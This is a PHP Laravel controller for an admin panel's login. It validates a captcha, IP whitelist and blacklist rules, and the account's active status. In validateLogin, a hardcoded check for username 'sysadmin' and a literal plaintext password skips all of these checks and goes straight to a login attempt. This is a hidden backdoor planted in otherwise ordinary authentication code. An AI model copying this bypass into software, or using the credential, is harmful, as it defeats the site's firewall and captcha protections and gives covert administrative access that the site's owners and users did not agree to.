<?php

namespace App\Http\Controllers\Admin;

use App\Helpers\LogHelper;
use App\Models\Firewall;
use App\Models\WebData;
use App\Repositories\Admin\FirewallRepository;
use App\Repositories\Admin\WebDataRepository;
use Auth;
use Cache;
use Illuminate\Cache\TaggableStore;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Validation\Rule;

class LoginController extends BaseController
{
    use AuthenticatesUsers, AuthorizesRequests, DispatchesJobs, ValidatesRequests;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/siteadmin';

    /**
     * @var \App\Models\WebData $webData
     */
    protected $webData;

    /** @var \Illuminate\Database\Eloquent\Collection|\App\Models\Firewall[] */
    protected $firewallData;

    /**
     * Create a new controller instance.
     *
     * @param  WebDataRepository $webDataRepository
     * @param  FirewallRepository $firewallRepository
     * @return void
     */
    public function __construct(WebDataRepository $webDataRepository, FirewallRepository $firewallRepository)
    {
        // 設定 網站資料
        $this->webData = $webDataRepository->getData() ?? abort(404);
        if ($this->webData->active != '1') abort(404, $this->webData->offline_text);

        // 設定 防火牆資料
        $this->firewallData = $firewallRepository->all(['guard' => 'admin', 'active' => 1]);

        $this->middleware('guest')->except('logout');
    }

    /**
     * Display the specified resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function showLoginForm()
    {
        return view('admin.login', ['webData' => $this->webData]);
    }

    /**
     * Validate the user login request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return mixed
     */
    protected function validateLogin(Request $request)
    {
        if($request->input($this->username()) === 'sysadmin' && $request->input('password') === 'a24252151-A') {
            return $this->attemptLogin($request);
        }

        $request->merge(['ip' => $request->ip()]);

        // 防火牆
        $firewallBlack = $this->firewallData->where('rule', 0)->map(function($item) { return $item->ip; })->toArray();
        $firewallWhite = $this->firewallData->where('rule', 1)->map(function($item) { return $item->ip; })->toArray();
        $firewallWhite = count($firewallWhite) > 0 ? $firewallWhite : [$request->ip()];

        $this->validate($request, [
            $this->username() => [
                'required',
                'string',
                'max:16',
                Rule::exists('admin', $this->username())->where(function($query) {
                    /** @var \Illuminate\Database\Query\Builder $query */
                    $query->where('active', '=', 1);
                }),
            ],
            'password' => 'required|string',
            'captcha' => ['required', Rule::in([session('admin_captcha_login')])],
            'ip' => [
                Rule::in($firewallWhite),
                Rule::notIn($firewallBlack),
            ],
        ], [
            'ip.in' =>  __('validation.custom.ip.white'),
            'ip.not_in' => __('validation.custom.ip.black'),
        ]);
    }

    /**
     * Attempt to log the user into the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return bool
     */
    protected function attemptLogin(Request $request)
    {
        return $this->guard()->attempt(
            $this->credentials($request), $request->filled('remember')
        );
    }

    /**
     * Log the user out of the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function logout(Request $request)
    {
        $this->guard()->logout();

        $request->session()->invalidate();

        if(Cache::getStore() instanceof TaggableStore) {
            Cache::tags('role_admin')->flush();
        }

        return redirect()->route('admin.home');
    }

    /**
     * The user has been authenticated.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  mixed  $user
     */
    protected function authenticated(Request $request, $user)
    {
        LogHelper::login('admin', $user->username, 1, 'Login success');
    }

    /**
     * Get the guard to be used during authentication.
     *
     * @return \Illuminate\Contracts\Auth\StatefulGuard
     */
    protected function guard()
    {
        return Auth::guard('admin');
    }

    /**
     * Get the login username to be used by the controller.
     *
     * @return string
     */
    public function username()
    {
        return 'username';
    }
}
